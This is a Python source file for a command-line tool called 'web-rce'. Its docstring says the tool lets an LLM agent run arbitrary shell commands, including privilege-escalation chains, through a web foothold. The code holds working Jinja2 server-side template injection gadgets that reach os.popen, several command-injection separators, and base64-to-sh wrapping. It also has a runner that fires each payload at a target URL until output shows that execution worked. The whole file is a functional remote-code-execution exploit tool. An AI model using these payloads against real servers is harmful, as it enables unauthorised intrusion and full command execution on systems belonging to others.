#!/usr/bin/env python3
"""Deterministic web-RCE helper (`web-rce`).

The LLM reliably gets a foothold (SSTI / command injection) but reliably FAILS to hand-encode a
multi-step payload through a URL parameter: spaces break it, base64 `+`/`/`/`=` get corrupted
(`+` decodes to a space), pipes/braces need escaping. This tool does it correctly so the agent can
run ANY shell command (incl. a full privesc chain) through the foothold with one invocation:

  web-rce --url http://t/        --param name --mode ssti --cmd 'id'
  web-rce --url http://t/ping    --param host --mode cmdi --method POST --cmd 'id'
  web-rce --url http://t/        --param name --mode auto --cmd '<multi-step script>'

It base64-wraps the whole command (so multi-step scripts survive), then URL-encodes the ENTIRE
query value (so `+`/`/`/spaces/pipes/braces can't corrupt it), and tries known SSTI gadgets /
injection separators until one returns output. Pure builders are unit-tested; the runner is I/O.
Self-contained (stdlib only) so it runs on the Kali runner without Grin installed."""
import argparse
import base64
import sys
import urllib.parse
import urllib.request

# Known Jinja2 SSTI RCE gadgets, tried in order. {q} is the quoted shell command for os.popen.
SSTI_GADGETS = [
    'cycler.__init__.__globals__.os.popen({q}).read()',
    'lipsum.__globals__["os"].popen({q}).read()',
    'config.__class__.__init__.__globals__["os"].popen({q}).read()',
    'self.__init__.__globals__.__builtins__.__import__("os").popen({q}).read()',
    'request.application.__globals__.__builtins__.__import__("os").popen({q}).read()',
]

# Command-injection separators, tried in order — one is often filtered while another works.
CMDI_SEPS = [";", "|", "&&", "\n", "$()"]


def wrapped_cmd(cmd: str) -> str:
    """base64-pipe the whole command so an arbitrary multi-step script survives transport intact
    (decoded and run on the target, not in the URL)."""
    b64 = base64.b64encode(cmd.encode()).decode()
    return f"echo {b64} | base64 -d | sh"


def ssti_payload(cmd: str, gadget: str) -> str:
    """A Jinja2 SSTI payload that runs cmd via the given gadget."""
    inner = wrapped_cmd(cmd)
    q = '"' + inner + '"'                       # inner has no double-quotes (base64 + safe chars)
    return "{{" + gadget.format(q=q) + "}}"


def cmdi_value(host: str, cmd: str, sep: str) -> str:
    """A command-injection parameter value chaining cmd onto a benign host using sep."""
    inner = wrapped_cmd(cmd)
    if sep == "$()":
        return f"{host}$({inner})"
    return f"{host}{sep}{inner}"


def build_query(param: str, value: str) -> str:
    """`param=<fully-percent-encoded value>`. Encoding the WHOLE value is the fix: it stops `+`,
    `/`, `=`, spaces, pipes and braces from being mangled by the server's query parser."""
    return f"{param}=" + urllib.parse.quote(value, safe="")


# ---------------------------------------------------------------------------
# Runner (I/O) — try gadgets/separators until output appears
# ---------------------------------------------------------------------------

def _request(url: str, param: str, value: str, method: str, timeout: float = 15.0) -> str:
    body = build_query(param, value).encode()
    if method.upper() == "POST":
        req = urllib.request.Request(url, data=body,
                                     headers={"Content-Type": "application/x-www-form-urlencoded"})
    else:
        sep = "&" if "?" in url else "?"
        req = urllib.request.Request(url + sep + build_query(param, value))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except Exception as e:
        return f"[web-rce request error: {e}]"


def _marker_cmd(cmd: str) -> str:
    """Bracket the real output so we can tell a working injection from a reflected echo."""
    return f"echo __RCEr_START__; {cmd}; echo __RCEr_END__"


def run(url: str, param: str, mode: str, cmd: str, method: str = "GET") -> str:
    """Try the configured gadgets/separators; return the first response that shows real execution
    (our markers present), else the last response for debugging."""
    marked = _marker_cmd(cmd)
    attempts = []
    if mode in ("ssti", "auto"):
        attempts += [("ssti", g) for g in SSTI_GADGETS]
    if mode in ("cmdi", "auto"):
        attempts += [("cmdi", s) for s in CMDI_SEPS]
    last = ""
    for kind, variant in attempts:
        value = ssti_payload(marked, variant) if kind == "ssti" else cmdi_value("127.0.0.1", marked, variant)
        last = _request(url, param, value, method)
        if "__RCEr_START__" in last:
            out = last.split("__RCEr_START__", 1)[1].split("__RCEr_END__", 1)[0].strip()
            return out if out else "[web-rce: executed, no output]"
    return f"[web-rce: no working vector found via {mode}]\n{last[:500]}"


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="web-rce", description="Deterministic web-RCE payload runner")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", default="name")
    ap.add_argument("--mode", choices=["ssti", "cmdi", "auto"], default="auto")
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--cmd", required=True, help="shell command/script to run on the target")
    a = ap.parse_args(argv)
    print(run(a.url, a.param, a.mode, a.cmd, a.method))
    return 0


if __name__ == "__main__":
    sys.exit(main())
